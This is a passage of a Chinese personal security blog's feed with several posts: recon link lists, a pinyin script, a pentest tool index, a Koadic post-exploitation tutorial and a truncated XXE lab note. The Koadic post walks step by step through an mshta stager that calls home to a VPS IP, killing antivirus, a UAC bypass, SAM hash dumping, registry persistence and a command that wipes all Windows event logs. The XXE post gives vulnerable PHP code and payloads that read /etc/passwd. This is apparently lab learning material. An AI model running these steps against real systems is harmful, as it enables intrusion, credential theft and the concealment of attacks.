    <content type="html"><![CDATA[<a id="more"></a><ul><li>1.天眼查</li></ul><blockquote><p><a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></p></blockquote><ul><li>2.ICP备案查询网</li></ul><blockquote><p><a href="http://www.beianbeian.com/">http://www.beianbeian.com/</a></p></blockquote><ul><li>3.爱站备案查询</li></ul><blockquote><p><a href="https://icp.aizhan.com/">https://icp.aizhan.com</a></p></blockquote><ul><li>4.域名助手备案信息查询</li></ul><blockquote><p><a href="http://cha.fute.com/index">http://cha.fute.com/index</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;1.天眼查&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://www.tianyancha.com/&quot;&gt;https://www.tianyancha.com/&lt;/a&gt;&lt;/p&gt;
&lt;/blo</summary>
      
    
    
    
    <category term="信息收集" scheme="http://zzqsmile.top/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
    <category term="信息收集" scheme="http://zzqsmile.top/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://zzqsmile.top/2020/08/19/hello-world/"/>
    <id>http://zzqsmile.top/2020/08/19/hello-world/</id>
    <published>2020-08-19T15:27:43.330Z</published>
    <updated>2020-08-24T14:34:01.790Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Welcome here!</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>实现姓名汉字转成拼音</title>
    <link href="http://zzqsmile.top/2019/09/13/python3/%E5%A7%93%E5%90%8D%E6%B1%89%E5%AD%97%E8%BD%AC%E6%8B%BC%E9%9F%B3/"/>
    <id>http://zzqsmile.top/2019/09/13/python3/%E5%A7%93%E5%90%8D%E6%B1%89%E5%AD%97%E8%BD%AC%E6%8B%BC%E9%9F%B3/</id>
    <published>2019-09-13T01:00:00.000Z</published>
    <updated>2019-09-25T09:48:14.000Z</updated>
    
    <content type="html"><![CDATA[<p>收藏下，汉字转成拼音，以备不时之需。</p><a id="more"></a><blockquote><p>eg:<br>张三丰 —&gt;  zhangsf<br>吴京 —&gt;  wujing</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from xpinyin import Pinyin</span><br><span class="line"></span><br><span class="line">with open(&#39;1.txt&#39;, encoding&#x3D;&#39;utf8&#39;) as fp:</span><br><span class="line">    # print(fp.read())</span><br><span class="line">    word_list &#x3D; fp.readlines()</span><br><span class="line">for word in word_list:</span><br><span class="line">    name &#x3D; word.strip()</span><br><span class="line">    pin &#x3D; Pinyin()</span><br><span class="line">    name_list &#x3D; pin.get_pinyin(name).split(&#39;-&#39;)</span><br><span class="line">    # print(name_list)</span><br><span class="line">    if len(name_list) &gt; 2:</span><br><span class="line">        # print(name_list, len(name_list))</span><br><span class="line">        name &#x3D; name_list[0]</span><br><span class="line">        for i in range(len(name_list)-1):</span><br><span class="line">            name +&#x3D; name_list[i+1][0]</span><br><span class="line">    else:</span><br><span class="line">        name &#x3D; &#39;&#39;.join(name_list)</span><br><span class="line">    print(name)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;收藏下，汉字转成拼音，以备不时之需。&lt;/p&gt;</summary>
    
    
    
    <category term="python3" scheme="http://zzqsmile.top/categories/python3/"/>
    
    
    <category term="小工具" scheme="http://zzqsmile.top/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>工具导航</title>
    <link href="http://zzqsmile.top/2019/08/25/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E5%B7%A5%E5%85%B7%E5%AF%BC%E8%88%AA/"/>
    <id>http://zzqsmile.top/2019/08/25/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E5%B7%A5%E5%85%B7%E5%AF%BC%E8%88%AA/</id>
    <published>2019-08-25T01:00:00.000Z</published>
    <updated>2020-08-23T12:00:08.671Z</updated>
    
    <content type="html"><![CDATA[<p>实用小工具导航</p><a id="more"></a><h5 id="在线"><a href="#在线" class="headerlink" title="在线"></a>在线</h5><p><a href="http://tools.hackxc.cc/cai/">猜密码</a>    |    <a href="http://tools.hackxc.cc/qc/">文本去重</a>    |    <a href="http://scan.ssleye.com/">SSL漏洞在线检测工具</a></p><h5 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h5><p><a href="https://www.zoomeye.org/">ZoomEye</a>    |    <a href="https://www.shodan.io/">Shodan</a>    |    <a href="https://fofa.so/">FOFA</a></p><h5 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h5><p><a href="https://www.voidtools.com/zh-cn/downloads/">Everything</a></p><h5 id="JBOSS"><a href="#JBOSS" class="headerlink" title="JBOSS"></a>JBOSS</h5><ul><li><a href="https://github.com/joaomatosf/jexboss">https://github.com/joaomatosf/jexboss</a></li></ul><h5 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h5><ul><li><a href="https://github.com/tarunkant/Gopherus">gopher链接生成工具</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;实用小工具导航&lt;/p&gt;</summary>
    
    
    
    <category term="工具" scheme="http://zzqsmile.top/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="传送门" scheme="http://zzqsmile.top/tags/%E4%BC%A0%E9%80%81%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试流程导航</title>
    <link href="http://zzqsmile.top/2019/08/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <id>http://zzqsmile.top/2019/08/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</id>
    <published>2019-08-25T01:00:00.000Z</published>
    <updated>2020-08-23T12:03:04.876Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><h6 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h6><p>包括但不限于以下信息：</p><pre><code>域名服务商 ：域名拥有者 ：电     话 ：邮     箱 ：地     址 ：</code></pre><ul><li>kali whois命令</li><li><a href="http://whois.chinaz.com/">站长之家</a></li><li><a href="https://whois.aizhan.com/">爱站工具网</a></li><li><a href="http://www.beianbeian.com/">备案</a></li><li><a href="https://www.tianyancha.com/">天眼查</a></li></ul><h6 id="真实IP"><a href="#真实IP" class="headerlink" title="真实IP"></a>真实IP</h6><h6 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h6><p><strong>工具</strong></p><ul><li>Layer子域名挖掘机</li></ul><p><strong>在线</strong></p><ul><li><a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></li><li><a href="https://dns.aizhan.com/">IP反查绑定域名网站</a></li></ul><p><strong>搜索引擎枚举</strong></p><ul><li><a href="https://www.google.com/">Google hacking</a></li></ul><p><strong>第三方聚合应用枚举</strong></p><ul><li><a href="https://dnsdumpster.com/">DNSdumpster</a></li></ul><p><strong>证书透明度公开日志枚举</strong></p><ul><li><a href="https://crt.sh/">crt.sh</a></li><li><a href="https://censys.io/">censys</a></li></ul><h6 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h6><ul><li><a href="https://nmap.org/">nmap</a></li></ul><h6 id="目录后台"><a href="#目录后台" class="headerlink" title="目录后台"></a>目录后台</h6><ul><li><p>御剑</p></li><li><p><a href="https://github.com/maurosoria/dirsearch">dirsearch</a></p><blockquote><p>字典：<a href="http://github.itzmx.com/juzeon/fire/master/dics_cn.zip">http://github.itzmx.com/juzeon/fire/master/dics_cn.zip</a></p></blockquote></li><li><p><a href="https://github.com/maurosoria/dirsearch">dirsearch</a></p></li><li></li><li><p><a href="https://github.com/H4ckForJob/dirmap">dirmap</a></p></li><li><p><a href="https://www.google.com/">Google hacking</a></p></li><li><p>robots.txt</p></li></ul><h6 id="C段"><a href="#C段" class="headerlink" title="C段"></a>C段</h6><ul><li><a href="http://www.webscan.cc/">webscan</a></li><li><a href="https://phpinfo.me/bing/">在线</a></li></ul><h6 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h6><p><strong>工具</strong></p><ul><li>御剑Web指纹识别</li><li>WhatWeb</li><li>WebRobo</li><li>椰树</li><li>轻量WEB指纹识别</li></ul><p><strong>在线CMS识别</strong></p><ul><li><a href="http://whatweb.bugscaner.com/look/">BugScaner</a></li><li><a href="http://www.yunsee.cn/finger.html">云悉指纹</a></li><li><a href="https://whatweb.net/">WhatWeb</a></li></ul><h6 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h6><ul><li><a href="https://crt.sh/">crt.sh</a></li><li><a href="https://censys.io/">censys</a></li></ul><h6 id="github"><a href="#github" class="headerlink" title="github"></a>github</h6><h6 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h6><ul><li>略</li></ul><h6 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h6><ul><li>ZoomEye <a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></li><li>Shodan  <a href="https://www.shodan.io/">https://www.shodan.io/</a></li><li>FOFA    <a href="https://fofa.so/">https://fofa.so/</a></li></ul><h6 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h6><p>中国菜刀        |    <a href="https://github.com/AntSwordProject/antSword/releases">中国蚁剑</a> <a href="https://github.com/AntSwordProject/AntSword-Loader">官方加载器</a>     |    Cknife        |    <a href="https://github.com/rebeyond/Behinder">冰蝎</a>     |</p><p>xshell    |    putty     |    <a href="https://www.teamviewer.cn/cn/">teamviewer</a>    |    <a href="https://sunlogin.oray.com/personal/">向日葵</a>        |</p><h6 id="后渗透工具"><a href="#后渗透工具" class="headerlink" title="后渗透工具"></a>后渗透工具</h6><p><a href="https://github.com/rapid7/metasploit-framework">MSF</a>        |    <a href="https://github.com/zerosum0x0/koadic">Koadic</a>    |    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h4 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h4&gt;&lt;h6 id=&quot;whois&quot;&gt;&lt;a href=&quot;#whois&quot; class=&quot;headerl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://zzqsmile.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="传送门" scheme="http://zzqsmile.top/tags/%E4%BC%A0%E9%80%81%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>Koadic使用教程笔记</title>
    <link href="http://zzqsmile.top/2019/08/21/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Koadic%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/"/>
    <id>http://zzqsmile.top/2019/08/21/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Koadic%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/</id>
    <published>2019-08-21T01:00:00.000Z</published>
    <updated>2020-08-23T12:03:36.760Z</updated>
    
    <content type="html"><![CDATA[<p>记录Koadic使用笔记</p><a id="more"></a><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><pre><code>[root@host ~]# git clone https://github.com/zerosum0x0/koadic.git[root@host ~]# cd koadic/[root@host koadic]# ./koadic                             .                           / \     _                   _ | |    | | _____   __ _  __| || |  ___    | |/ / _ \ / _` |/ _` ||.| / __|    |   / (o) | (_| | (_| ||.|| (__    |_|\_\_^_/ \__,_|\__,_||:| \___|                           |:|                        ~\==8==/~                            8                            O        -&#123; COM Command &amp; Control &#125;-      Windows Post-Exploitation Tools             Endless Intellect            ~[ Version:  0xA ]~            ~[ Stagers:    6 ]~            ~[ Implants:  42 ]~(koadic: sta/js/mshta)# </code></pre><p><strong>注意：</strong> 需要<code>python3</code>环境，安装过程如果报错，可能缺少<code>python</code>模块，请使用<code>pip3 install [缺少模块]</code>安装。</p><h5 id="使用帮助"><a href="#使用帮助" class="headerlink" title="使用帮助"></a>使用帮助</h5><ul><li><p><code>help</code>命令查看</p><p>  (koadic: sta/js/mshta)# help </p><pre><code>  COMMAND     DESCRIPTION       ---------   -------------     api         turn off/on the rest api  cmdshell    command shell to interact with a zombie  creds       shows collected credentials  domain      shows collected domain information  edit        shell out to an editor for the current module  exit        exits the program  help        displays help info for a command  info        shows the current module options  jobs        shows info about jobs  kill        kill a job or all jobs  listeners   shows info about stagers  load        reloads all modules  previous    go back to the last used module  pyexec      evals some python  repeatjobs  shows info about repeating jobs  run         runs the current module  set         sets a variable for the current module  sounds      turn sounds off/on: sound(0|1)  taco        taco time         unset       unsets a variable for the current module  use         switch to a different module  verbose     turn verbosity off/on: verbose (0|1)  zombies     lists hooked targets</code></pre><p>  Use “help command” to find more info about a command.</p><p>  (koadic: sta/js/mshta)# </p></li></ul><h5 id="KOADIC模块说明"><a href="#KOADIC模块说明" class="headerlink" title="KOADIC模块说明"></a>KOADIC模块说明</h5><ul><li><p>输入use和空格然后连按两下Tab键查看模块</p><p>  (koadic: sta/js/mshta)# use [Tab][Tab]<br>  implant/  stager/<br>  (koadic: sta/js/mshta)# </p></li></ul><blockquote><p>stager开头的模块是用来反弹主机的，implant开头的模块是用来对反弹的主机进行操作</p></blockquote><h5 id="KOADIC使用"><a href="#KOADIC使用" class="headerlink" title="KOADIC使用"></a>KOADIC使用</h5><p>Koadic有几个内置模块，“stager/js/mshta”是首次执行该工具时的默认配置模块。你可以通过“info”命令来查看并配置模块。</p><pre><code>(koadic: sta/js/mshta)# info     NAME       VALUE               REQ     DESCRIPTION         -----      ------------        ----    -------------       SRVHOST    107.182.30.95       yes     Where the stager should call home    SRVPORT    9999                yes     The port to listen for stagers on    EXPIRES                        no      MM/DD/YYYY to stop calling home    KEYPATH                        no      Private key for TLS communications    CERTPATH                       no      Certificate for TLS communications    MODULE                         no      Module to run once zombie is staged(koadic: sta/js/mshta)# </code></pre><p>可以看出，我们必须设置<code>SRVHOST</code>和<code>SRVPORT</code>参数才能使用<code>satger</code>。运行以下命令，用你自己的IP替换IP和端口号，并运行：</p><pre><code>(koadic: sta/js/mshta)# set SRVHOST 107.182.30.95[+] SRVHOST =&gt; 107.182.30.95    (koadic: sta/js/mshta)# set SRVPORT 9999[+] SRVPORT =&gt; 9999(koadic: sta/js/mshta)# run[+] Spawned a stager at http://107.182.30.95:9999/Dj7wx[!] Don&#39;t edit this URL! (See: &#39;help portfwd&#39;)[&gt;] mshta http://107.182.30.95:9999/Dj7wx(koadic: sta/js/mshta)# </code></pre><p>复制日志底部生成的命令并在目标计算机上运行。</p><p><img src="http://qiniuyun.zzqsmile.top/blog/20190821/Sg9GQPnKIkHq.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><blockquote><p>一个zombie机器被创建，目标机器现在已连接到了mshta stager server。<br>立即创建僵尸，目标机器现在连接到mshta stager服务器。<br>可以运行以下命令进行确认：</p></blockquote><pre><code>(koadic: sta/js/mshta)# zombies</code></pre><p><img src="http://qiniuyun.zzqsmile.top/blog/20190821/0oMDlbgKXmsa.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><blockquote><p>该命令将显示所有的zombie机器，我们可以看到这里只显示了个“Zombie 0”，这是因为它是迄今为止我们唯一创建的一个zombie。</p></blockquote><h5 id="“杀死”防毒软件"><a href="#“杀死”防毒软件" class="headerlink" title="“杀死”防毒软件"></a>“杀死”防毒软件</h5><blockquote><p>下一步是杀死windows defender和所有其他正在运行的防病毒软件，以确保我们可以在目标计算机上执行任何我们想要执行的命令。</p></blockquote><p>命令如下：</p><pre><code>(koadic: sta/js/mshta)# use implant/manage/killav (koadic: imp/man/killav)# info (koadic: imp/man/killav)# set ZOMBIE 0(koadic: imp/man/killav)# run </code></pre><p><img src="http://qiniuyun.zzqsmile.top/blog/20190821/98B2ABbANAK9.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><p>要确认模块是否已成功执行，请运行：</p><pre><code>(koadic: imp/man/killav)# zombies 0</code></pre><h5 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h5><p>使用<code>implant/elevate/bypassuac_compdefaults</code>，命令如下：</p><pre><code>(koadic: imp/man/killav)# use implant/elevate/bypassuac_compdefaults (koadic: imp/ele/bypassuac_compdefaults)# info (koadic: imp/ele/bypassuac_compdefaults)# listeners (koadic: imp/ele/bypassuac_compdefaults)# set PAYLOAD 0(koadic: imp/ele/bypassuac_compdefaults)# run </code></pre><p>运行以下命令确认模块是否已被成功执行：</p><pre><code>(koadic: imp/ele/bypassuac_compdefaults)# zombies</code></pre><blockquote><p>使用<code>implant/manage/exec_cmd</code>在CMD上运行任何Windows命令。</p></blockquote><p>命令如下：</p><pre><code>(koadic: imp/ele/bypassuac_compdefaults)# use implant/manage/exec_cmd (koadic: imp/man/exec_cmd)# info (koadic: imp/man/exec_cmd)# set ZOMBIE 0(koadic: imp/man/exec_cmd)# run </code></pre><p><img src="http://qiniuyun.zzqsmile.top/blog/20190821/HF2nRUpjOu7I.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><p><code>hostname</code>命令在目标机器上执行，将返回机器的名称。</p><blockquote><p>将CMD参数更改为<code>whoami</code>会返回我们正在运行的用户的名称,如下所示。</p></blockquote><p><img src="http://qiniuyun.zzqsmile.top/blog/20190821/5mEHiN8qhfxa.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><ul><li><p>cmdshell也可以直接进入终端模式下执行命令，如下：</p><p>  (koadic: imp/man/exec_cmd)# cmdshell 0<br>  [koadic: ZOMBIE 0 (192.168.199.193) - C:]&gt; whoami<br>  [*] Zombie 0: Job 9 (implant/manage/exec_cmd) created.<br>  Result for <code>cd C:\ &amp; whoami</code>:<br>  zzqsmile\administrator                       </p><p>  [koadic: ZOMBIE 0 (192.168.199.193) - C:]&gt; </p></li></ul><p><img src="http://qiniuyun.zzqsmile.top/blog/20190821/JxvGd16C5jeN.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><h5 id="INTEL-RAID-持久性和数据渗漏"><a href="#INTEL-RAID-持久性和数据渗漏" class="headerlink" title="INTEL RAID/持久性和数据渗漏"></a>INTEL RAID/持久性和数据渗漏</h5><blockquote><p>使用<code>implant/gather/hashdump_sam</code>模块，来获取目标计算机上的哈希值。</p></blockquote><p>命令如下：</p><pre><code>(koadic: imp/man/exec_cmd)# use implant/gather/hashdump_sam (koadic: imp/gat/hashdump_sam)# info (koadic: imp/gat/hashdump_sam)# set GETSYSHIVE true(koadic: imp/gat/hashdump_sam)# run </code></pre><blockquote><p>使用<code>implant/persist/registry</code>模块，运行以下命令：</p></blockquote><pre><code>(koadic: imp/gat/hashdump_sam)# use implant/persist/registry (koadic: imp/per/registry)# info   (koadic: imp/per/registry)# set PAYLOAD 0(koadic: imp/per/registry)# set ZOMBIE 0(koadic: imp/per/registry)# run </code></pre><p>使用该模块，我们可以将<code>CLEANUP</code>参数设置为<code>true</code>以删除注册表项，从而隐藏我们的轨迹。</p><blockquote><p>对于刚刚我们获取哈希值的操作，可以运行<code>for /F “tokens=*” %1 in (‘wevtutil.exe el’) DO wevtutil.exe cl “%1″</code>命令，使用<code>implant/manage/exec_cmd</code>模块来清除所有事件日志。命令如下：</p></blockquote><pre><code>(koadic: imp/per/registry)# use implant/manage/exec_cmd (koadic: imp/man/exec_cmd)# info (koadic: imp/man/exec_cmd)# set ZOMBIE 0(koadic: imp/man/exec_cmd)# set CMD for /F “tokens=*” %1 in (‘wevtutil.exe el’) DO wevtutil.exe cl “%1”(koadic: imp/man/exec_cmd)# run</code></pre><h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><p><a href="https://cloud.tencent.com/developer/article/1425744">后渗透工具Koadic实战</a></p><p><a href="https://www.cnblogs.com/sch01ar/p/7857531.html">windows提权辅助工具koadic</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录Koadic使用笔记&lt;/p&gt;</summary>
    
    
    
    <category term="工具" scheme="http://zzqsmile.top/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="Koadic" scheme="http://zzqsmile.top/tags/Koadic/"/>
    
  </entry>
  
  <entry>
    <title>msf安装使用教程</title>
    <link href="http://zzqsmile.top/2019/08/20/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/msf/"/>
    <id>http://zzqsmile.top/2019/08/20/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/msf/</id>
    <published>2019-08-20T01:00:00.000Z</published>
    <updated>2019-09-04T08:41:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>CentOS安装教程</p><a id="more"></a><p><a href="https://www.cnblogs.com/hiccup/p/4392082.html">CentOS6下安装</a></p><p><a href="https://www.1000001001.me/index.php/archives/8/">CentOS7下安装</a></p><p><a href="https://blog.csdn.net/qq_36119192/article/details/83215257#%E5%AE%89%E8%A3%85Metasploit">msf使用教程</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;CentOS安装教程&lt;/p&gt;</summary>
    
    
    
    <category term="tools" scheme="http://zzqsmile.top/categories/tools/"/>
    
    
    <category term="msf" scheme="http://zzqsmile.top/tags/msf/"/>
    
  </entry>
  
  <entry>
    <title>XXE漏洞笔记</title>
    <link href="http://zzqsmile.top/2019/08/19/web%E5%AE%89%E5%85%A8/XXE/"/>
    <id>http://zzqsmile.top/2019/08/19/web%E5%AE%89%E5%85%A8/XXE/</id>
    <published>2019-08-19T01:00:00.000Z</published>
    <updated>2020-10-18T08:00:33.379Z</updated>
    
    <content type="html"><![CDATA[<p>好记性不如烂笔头，关于XXE还是要记录下自己的学习过程，以后看起来会更清楚，详细原理不再多讲，简单做个实验记录下笔记以便使用。</p><a id="more"></a><h5 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">web服务器：10.12.10.198</span><br><span class="line">VPS：     107.182.30.95      </span><br></pre></td></tr></table></figure><h5 id="实验一：有回显读本地敏感文件-Normal-XXE"><a href="#实验一：有回显读本地敏感文件-Normal-XXE" class="headerlink" title="实验一：有回显读本地敏感文件(Normal XXE)"></a>实验一：有回显读本地敏感文件(Normal XXE)</h5><p>web服务器放置解析XML的php代码：</p><p><strong>示例代码</strong></p><p><strong>xml.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    <span class="keyword">echo</span> $creds;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;goodies;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>结果如下</strong></p><p><img src="http://qiniuyun.zzqsmile.top/blog/20190819/a0kJBVemEnx0.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><p>读取文件种可能会有特殊符号如<code>&amp;</code>,<code>&lt;</code>,<code>&gt;</code>,<code>&quot;</code>,<code>&#39;</code>等会导致读取失败，比如下面读取含有特殊字符文件<code>2.txt</code>失败：</p><p><img src="http://qiniuyun.zzqsmile.top/blog/20190820/uU0qkKQgzgrt.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><p>废话不多说，解决办法有两种：</p><ul><li>第一种：将读取文件使用<code>base64</code>编码即可</li></ul><p><strong>payload:</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;goodies;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>结果如下</strong></p><p><img src="http://qiniuyun.zzqsmile.top/blog/20190819/b3jxkk5ssclx.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><ul><li>第二种：将读取数据放在<code>CDATA</code>中输出进行绕过</li></ul><p><strong>payload:</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 